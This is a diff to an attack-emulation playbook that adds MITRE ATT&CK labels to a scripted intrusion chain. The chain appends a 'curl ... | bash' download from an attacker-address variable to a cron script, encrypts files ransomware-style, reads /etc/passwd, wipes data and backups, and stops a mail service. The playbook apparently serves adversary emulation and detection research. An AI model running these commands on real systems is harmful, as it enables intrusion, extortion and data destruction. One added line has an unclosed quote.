@@ -33,12 +33,18 @@ commands:
       x: 5
       y: 5
     metadata:
-      techniques: "T1110"
-      tactics: "Credential Access"
+      techniques: "T1110.001,T1021.005"
+      tactics: "Credential Access, Lateral Movement"
+      technique_name: "Brute Force: Password Guessing,Remote Services: VNC"
 
   - type: vnc
     session: foothold
     cmd: click
+    metadata:
+      techniques: "T1021.005"
+      tactics: "Lateral Movement"
+      technique_name: "Remote Services: VNC"
+
   - type: sleep
     seconds: 3
 
@@ -46,6 +52,10 @@ commands:
     session: foothold
     cmd: type
     input: "terminal"
+    metadata:
+      techniques: "T1021.005"
+      tactics: "Lateral Movement"
+      technique_name: "Remote Services: VNC"
 
   - type: sleep
     seconds: 3
@@ -62,6 +72,10 @@ commands:
     session: foothold
     cmd: type
     input: "sudo -i"
+    metadata:
+      techniques: "T1021.005"
+      tactics: "Lateral Movement"
+      technique_name: "Remote Services: VNC"
 
   - type: sleep
     seconds: 3
@@ -79,8 +93,9 @@ commands:
     cmd: type
     input: echo "curl http://$ATTACKER_ADDRESS:8888/install.sh | bash" >> /media/share/healthcheck_cron.sh
     metadata:
-      techniques: "T1105,T1059,T1564"
-      tactics: "Execution, Defense Evasion"
+      techniques: "T1105,T1059.004,T1053.003,T1021.005,T1071.001"
+      tactics: "Execution,Defense Evasion,Persistence,Command and Control"
+      technique_name: "Ingress Tool Transfer,Command and Scripting Interpreter: Unix Shell,Scheduled Task/Job: Cron,Remote Services: VNC,Application Layer Protocol: Web Protocols"
 
   - type: sleep
     seconds: 2
@@ -123,6 +138,10 @@ commands:
   - type: vnc
     cmd: close
     session: foothold
+    metadata:
+      techniques: "T1021.005"
+      tactics: "Lateral Movement"
+      technique_name: "Remote Services: VNC"
 
 #################### MOVED ############################################
   - type: msf-session
@@ -159,14 +178,15 @@ commands:
     metadata:
       techniques: "T1486,T1105"
       tactics: "Impact,Command and Control"
-      technique_name:"Data Encrypted for Impact, Ingress Tool Transfer"
+      technique_name:"Data Encrypted for Impact,Ingress Tool Transfer"
 
   - type: msf-session
     session: movement
     cmd: /lib64/ld-linux-x86-64.so.2 /opt/donotcry encrypt /media/data/Images
     metadata:
-      techniques: "T1486,T1565"
+      techniques: "T1486,T1565.001"
       tactics: "Impact"
+      technique_name: "Data Encrypted for Impact,Data Manipulation: Stored Data Manipulation"
 
   - type: msf-session
     session: movement
@@ -174,13 +194,15 @@ commands:
     metadata:
       techniques: "T1018"
       tactics: "Discovery"
+      technique_name: "Remote System Discovery"
 
   - type: msf-session
     session: movement
     cmd: cat /etc/passwd
     metadata:
-      techniques: "T1087"
+      techniques: "T1087.001"
       tactics: "Discovery"
+      technique_name: "Account Discovery: Local Account"
   
   - type: msf-session
     session: movement
@@ -188,24 +210,28 @@ commands:
     metadata:
       techniques: "T1531"
       tactics: "Impact"
+      technique_name: "Account Access Removal"
   
   - type: msf-session
     session: movement
     cmd: rm -rf /media/data/*
     metadata:
-     techniques: "T1485"
-     tactics: "Impact"
+      techniques: "T1485"
+      tactics: "Impact
+      technique_name: "Data Destruction"
   
   - type: msf-session
     session: movement
     cmd: rm -rf /var/backups/*
     metadata:
-     techniques: "T1490"
-     tactics: "Impact"
+      techniques: "T1490"
+      tactics: "Impact"
+      technique_name: "Inhibit System Recovery"
 
   - type: msf-session
     session: movement
     cmd: systemctl stop exim4.service
     metadata:
-     techniques: "T1489"
-     tactics: "Impact"
+      techniques: "T1489"
+      tactics: "Impact"
+      technique_name: "Service Stop"
